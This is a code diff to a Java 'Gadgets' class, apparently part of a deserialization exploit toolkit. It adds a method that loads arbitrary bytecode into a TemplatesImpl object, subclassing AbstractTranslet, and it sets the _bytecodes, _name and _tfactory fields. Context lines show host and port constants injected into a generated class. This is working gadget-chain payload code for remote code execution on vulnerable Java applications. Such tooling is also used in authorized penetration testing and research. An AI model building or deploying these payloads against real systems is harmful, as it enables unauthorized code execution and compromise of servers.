@@ -9,6 +9,8 @@ import javassist.*;
 import javassist.bytecode.AccessFlag;
 import javassist.bytecode.ClassFile;
 
+import java.io.ByteArrayInputStream;
+
 public class Gadgets {
 
     public static TemplatesImpl createTemplatesImpl(String command) throws Exception {
@@ -49,6 +51,21 @@ public class Gadgets {
         ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(port));
 
         clazz.replaceClassName(clazz.getName(), MiscUtil.getClassName());
+
+        ReflectUtil.setFieldValue(templatesImpl, "_name", "Hello");
+        ReflectUtil.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
+        ReflectUtil.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
+
+        return templatesImpl;
+    }
+
+    public static TemplatesImpl createTemplatesImpl(byte[] byteCode) throws Exception {
+        TemplatesImpl templatesImpl = new TemplatesImpl();
+        ClassPool pool = ClassPool.getDefault();
+
+        CtClass clazz = pool.makeClass(new ByteArrayInputStream(byteCode));
+        CtClass superClazz = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
+        clazz.setSuperclass(superClazz);
 
         ReflectUtil.setFieldValue(templatesImpl, "_name", "Hello");
         ReflectUtil.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
